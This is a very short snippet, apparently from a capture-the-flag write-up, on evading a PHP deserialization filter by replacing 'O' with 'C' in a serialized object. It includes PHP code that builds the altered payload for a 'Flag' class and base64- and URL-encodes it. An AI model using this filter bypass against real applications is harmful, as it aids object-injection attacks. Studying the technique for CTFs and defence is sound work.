...
Bypass filter by using 'C' instead of 'O' for serialized object

```php
// Generated by serialize() - 'a:2:{i:0;s:4:"1337";i:1;O:4:"Flag":0:{}}'
$data = 'a:2:{i:0;s:4:"1337";i:1;C:4:"Flag":0:{}}';
echo urlencode(base64_encode($data));
```
